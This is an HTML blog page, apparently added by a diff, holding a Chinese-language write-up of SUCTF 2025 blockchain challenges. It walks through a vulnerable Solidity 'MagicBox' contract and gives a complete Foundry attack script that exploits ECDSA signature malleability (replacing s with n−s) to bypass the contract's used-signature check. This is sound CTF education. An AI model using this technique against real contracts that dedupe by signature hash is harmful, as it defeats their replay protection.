@@ -1,0 +1,285 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>suctf2025 | Q1ngying</title><meta name="author" content="Q1ngying"><meta name="copyright" content="Q1ngying"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#FFFFFF"><meta name="description" content="SUCTF blockchain wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="suctf2025">
+<meta property="og:url" content="https://q1ngying.cn/wp/suctf2025/index.html">
+<meta property="og:site_name" content="Q1ngying">
+<meta property="og:description" content="SUCTF blockchain wp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://q1ngying.cn/img/butterfly-icon.jpg">
+<meta property="article:published_time" content="2025-01-14T02:41:43.000Z">
+<meta property="article:modified_time" content="2025-01-14T02:46:11.879Z">
+<meta property="article:author" content="Q1ngying">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://q1ngying.cn/img/butterfly-icon.jpg"><link rel="shortcut icon" href="/img/icons8-clover-ios-16-glyph-32.png"><link rel="canonical" href="https://q1ngying.cn/wp/suctf2025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><meta name="google-site-verification" content="IzCM4B791_p7IAU4WhRfiLlPBnODnamJ7ixKxzoeNfk"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        if (name && globalFn[key][name]) return
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#1b1b1b')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#FFFFFF')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'suctf2025',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-01-14 10:46:11'
+}</script><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3Jzfa21KlLms3Lkh",ck:"3Jzfa21KlLms3Lkh"})</script><link rel="stylesheet" href="/css/style.css?1"><!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/butterfly-icon.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">85</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">30</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/back1.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Q1ngying</span></a><a class="nav-page-title" href="/"><span class="site-name">suctf2025</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">suctf2025</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-14T02:41:43.000Z" title="发表于 2025-01-14 10:41:43">2025-01-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-01-14T02:46:11.879Z" title="更新于 2025-01-14 10:46:11">2025-01-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/wp/">wp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">20k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>1:07分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="Onchain-Checkin"><a href="#Onchain-Checkin" class="headerlink" title="Onchain Checkin"></a>Onchain Checkin</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/45533658/1736593296285-8f7fa513-1c33-4a67-b5bf-236ff5ad2213.png" alt="img"></p>
+<p>这里是 program 的地址。explorer 上查询到如下数据：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/45533658/1736593567905-3e3dcdb4-6182-4f6c-91bf-18fe1b53881d.png" alt="img"></p>
+<p>这两个有一个是测试数据：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/45533658/1736593585602-c1fbb8e1-b4f3-4f8c-b256-1e5090502add.png" alt="img"></p>
+<p>另一个是对的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/45533658/1736593610549-23f78602-a8d7-441e-a2e0-4ed57280b3a9.png" alt="img"></p>
+<p>但是这里只有两个</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/45533658/1736593629493-b2bbd865-b051-41ca-b536-ee931c228fab.png" alt="img"></p>
+<p>另一个看源码这里：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/45533658/1736593659821-05d61d33-fc53-4b62-916d-55de75b51035.png" alt="img"></p>
+<p>这里提到了 account3 的公钥。试了下 base58 也能解出来：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/45533658/1736593752274-65d6c895-b02e-4ce3-85e5-4d2f2a72d7aa.png" alt="img"></p>
+<p>拼一下：</p>
+<p>SUCTF{Con9ra7s!YouHaveFound_7HE_KEeee3ey_P4rt_0f_Th3_F1ag.}</p>
+<h2 id="Onchain-Magician"><a href="#Onchain-Magician" class="headerlink" title="Onchain Magician"></a>Onchain Magician</h2><p>源码：</p>
+<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: UNLICENSED</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token number">0.8</span><span class="token number">.28</span><span class="token punctuation">;</span>
+
+<span class="token keyword">contract</span> <span class="token class-name">MagicBox</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">Signature</span> <span class="token punctuation">&#123;</span>
+        <span class="token builtin">uint8</span> v<span class="token punctuation">;</span>
+        <span class="token builtin">bytes32</span> r<span class="token punctuation">;</span>
+        <span class="token builtin">bytes32</span> s<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token builtin">address</span> magician<span class="token punctuation">;</span>
+    <span class="token builtin">bytes32</span> alreadyUsedSignatureHash<span class="token punctuation">;</span>
+    <span class="token builtin">bool</span> isOpened<span class="token punctuation">;</span>
+
+    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">isSolved</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> isOpened<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">getMessageHash</span><span class="token punctuation">(</span><span class="token builtin">address</span> _magician<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bytes32</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token string">"I want to open the magic box"</span><span class="token punctuation">,</span> _magician<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> block<span class="token punctuation">.</span>chainid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">_getSignerAndSignatureHash</span><span class="token punctuation">(</span>Signature <span class="token keyword">memory</span> _signature<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">,</span> <span class="token builtin">bytes32</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token builtin">address</span> signer <span class="token operator">=</span> <span class="token function">ecrecover</span><span class="token punctuation">(</span><span class="token function">getMessageHash</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">,</span> _signature<span class="token punctuation">.</span>v<span class="token punctuation">,</span> _signature<span class="token punctuation">.</span>r<span class="token punctuation">,</span> _signature<span class="token punctuation">.</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token builtin">bytes32</span> signatureHash <span class="token operator">=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>_signature<span class="token punctuation">.</span>v<span class="token punctuation">,</span> _signature<span class="token punctuation">.</span>r<span class="token punctuation">,</span> _signature<span class="token punctuation">.</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>signer<span class="token punctuation">,</span> signatureHash<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">signIn</span><span class="token punctuation">(</span>Signature <span class="token keyword">memory</span> signature<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">require</span><span class="token punctuation">(</span>magician <span class="token operator">==</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Magician already signed in"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">(</span><span class="token builtin">address</span> signer<span class="token punctuation">,</span> <span class="token builtin">bytes32</span> signatureHash<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">_getSignerAndSignatureHash</span><span class="token punctuation">(</span>signature<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">require</span><span class="token punctuation">(</span>signer <span class="token operator">==</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token string">"Invalid signature"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        magician <span class="token operator">=</span> signer<span class="token punctuation">;</span>
+        alreadyUsedSignatureHash <span class="token operator">=</span> signatureHash<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">openBox</span><span class="token punctuation">(</span>Signature <span class="token keyword">memory</span> signature<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">require</span><span class="token punctuation">(</span>magician <span class="token operator">==</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token string">"Only magician can open the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">(</span><span class="token builtin">address</span> signer<span class="token punctuation">,</span> <span class="token builtin">bytes32</span> signatureHash<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">_getSignerAndSignatureHash</span><span class="token punctuation">(</span>signature<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">require</span><span class="token punctuation">(</span>signer <span class="token operator">==</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token string">"Invalid signature"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">require</span><span class="token punctuation">(</span>signatureHash <span class="token operator">!=</span> alreadyUsedSignatureHash<span class="token punctuation">,</span> <span class="token string">"Signature already used"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        isOpened <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>分析：和其他的合约 ctf 一样，调用 <code>openBox</code>函数成功使得 <code>isOpened</code>为 ture 即可拿到 flag。</p>
+<p>大致一看，这道题需要我们签署原始交易，获得 v, r, s 的值。</p>
+<ul>
+<li><code>getMessageHash</code>：该函数用于构造合约预期的 message 摘要</li>
+<li><code>_getSignerAndSignatureHash</code>：内部函数，用于还原签名的签署者，以及获得签名的哈希</li>
+<li><code>signIn</code>：传递签名（这里要求我们 msg.sender 和还原出来的签名地址相同，同时在此之前没有调用过该函数），设置 <code>magician = signer</code></li>
+<li><code>openBox</code>：传递签名，想要调用成功，需要与上一次调用<code>signIn</code>的 signer 相同，同时<strong>签名的哈希不同</strong>。</li>
+</ul>
+<p>大致分析后，我们可以知道：<strong>每个人（signer）的交易哈希都只有一个，但是我们需要有两个不同的有效签名。这个实际上是以太坊的签名拓展性攻击漏洞。</strong></p>
+<p>关于该漏洞，详细流程可以查看我之前写的一篇文章：<a target="_blank" rel="noopener" href="https://learnblockchain.cn/article/8281">https://learnblockchain.cn/article/8281</a></p>
+<p>简单来说：由于以太坊底层使用的是 Secp256K1 椭圆曲线，该椭圆曲线，对于一个签名，有两个有效的 s 值。所以，通过构造，我们得到另一个有效的 s 值，将这个 s 值作为调用<code>openBox</code>中传递即可。</p>
+<p>对于计算 v、r、s，这里使用 foundry 的 <a target="_blank" rel="noopener" href="https://book.getfoundry.sh/cheatcodes/sign">sign cheatcode</a>。</p>
+<p>完整 Poc：</p>
+<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span>Script<span class="token punctuation">,</span> console2<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"forge-std/Script.sol"</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token punctuation">&#123;</span>MagicBox<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"../src/MagicBox.sol"</span><span class="token punctuation">;</span>
+
+<span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token keyword">is</span> Script <span class="token punctuation">&#123;</span>
+    <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span>
+        MagicBox target <span class="token operator">=</span> <span class="token function">MagicBox</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span><span class="token function">envAddress</span><span class="token punctuation">(</span><span class="token string">"target"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// secp256k1 曲线的阶 n</span>
+        <span class="token builtin">uint256</span> n <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        vm<span class="token punctuation">.</span><span class="token function">startBroadcast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token builtin">bytes32</span> MessageHash <span class="token operator">=</span> target<span class="token punctuation">.</span><span class="token function">getMessageHash</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span><span class="token function">envAddress</span><span class="token punctuation">(</span><span class="token string">"account"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        vm<span class="token punctuation">.</span><span class="token function">stopBroadcast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token punctuation">(</span><span class="token builtin">uint8</span> v<span class="token punctuation">,</span> <span class="token builtin">bytes32</span> r<span class="token punctuation">,</span> <span class="token builtin">bytes32</span> s<span class="token punctuation">)</span> <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span><span class="token function">envUint</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MessageHash<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        v <span class="token operator">=</span> <span class="token number">27</span><span class="token punctuation">;</span> <span class="token comment">// 27 还原出来的失败</span>
+        MagicBox<span class="token punctuation">.</span>Signature <span class="token keyword">memory</span> signature1 <span class="token operator">=</span> MagicBox<span class="token punctuation">.</span><span class="token function">Signature</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> r<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        MagicBox<span class="token punctuation">.</span>Signature <span class="token keyword">memory</span> signature2 <span class="token operator">=</span> MagicBox<span class="token punctuation">.</span><span class="token function">Signature</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token builtin">bytes32</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        vm<span class="token punctuation">.</span><span class="token function">startBroadcast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        target<span class="token punctuation">.</span><span class="token function">signIn</span><span class="token punctuation">(</span>signature1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        target<span class="token punctuation">.</span><span class="token function">openBox</span><span class="token punctuation">(</span>signature2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        vm<span class="token punctuation">.</span><span class="token function">stopBroadcast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里需要注意的问题是：</p>
+<p>以太坊的 v 值，有效值为 27 或 28，具体为哪个值，需要我们进行手动修改：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/45533658/1736575108156-cc83f3e2-9625-4c64-a3cb-cf70c967f9c6.png" alt="img"></p>
+<p>（第一次为 27 成功，第二次为 27 失败，修改为 28 后成功执行）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/45533658/1736575150058-e251a8fc-ff0d-4522-9578-6f8fdd474385.png" alt="img"></p>
+<p>之后广播即可：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/45533658/1736575167496-ae11248d-b78b-45bd-ad80-c5d52de17e77.png" alt="img"></p>
+<p>flag：SUCTF{C0n9r4ts!Y0u’re_An_0ut5taNd1ng_OnchA1n_Ma9ic1an.}</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/45533658/1736575200972-753d0432-20e6-4eed-8e00-58cc511f5644.png" alt="img"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://q1ngying.cn">Q1ngying</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://q1ngying.cn/wp/suctf2025/">https://q1ngying.cn/wp/suctf2025/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://q1ngying.cn" target="_blank">Q1ngying</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.jpg" data-sites="twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="next-post pull-full" href="/wp/track-ctf/" title="track-ctf 美梦成真"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">track-ctf 美梦成真</div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a href="/wp/track-ctf/" title="track-ctf 美梦成真"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-08</div><div class="title">track-ctf 美梦成真</div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Onchain-Checkin"><span class="toc-number">1.</span> <span class="toc-text">Onchain Checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Onchain-Magician"><span class="toc-number">2.</span> <span class="toc-text">Onchain Magician</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/back1.webp);"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By Q1ngying</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script>(() => {
+  const panguFn = () => {
+    if (typeof pangu === 'object') pangu.autoSpacingPage()
+    else {
+      btf.getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+        .then(() => {
+          pangu.autoSpacingPage()
+        })
+    }
+  }
+
+  const panguInit = () => {
+    if (false){
+      GLOBAL_CONFIG_SITE.isPost && panguFn()
+    } else {
+      panguFn()
+    }
+  }
+
+  btf.addGlobalFn('pjaxComplete', panguInit, 'pangu')
+  document.addEventListener('DOMContentLoaded', panguInit)
+})()</script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="17,185,200" opacity="0.8" zIndex="-1" count="200" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script></div></body></html>
